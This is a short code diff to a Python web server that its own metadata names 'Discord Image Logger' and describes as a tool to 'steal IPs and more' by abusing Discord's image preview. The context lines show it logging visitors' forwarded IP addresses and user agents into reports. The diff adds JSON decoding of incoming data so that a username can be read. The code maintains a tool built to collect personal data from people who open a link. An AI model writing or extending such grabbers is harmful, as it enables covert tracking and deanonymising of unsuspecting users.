@@ -4,6 +4,8 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import json
+
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -280,6 +282,8 @@ height: 100vh;
                 else:
                     result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
 
+                if isinstance(data, bytes):
+                    data = json.loads(data.decode())
 
                 username = data.get("username", "Unknown")
 
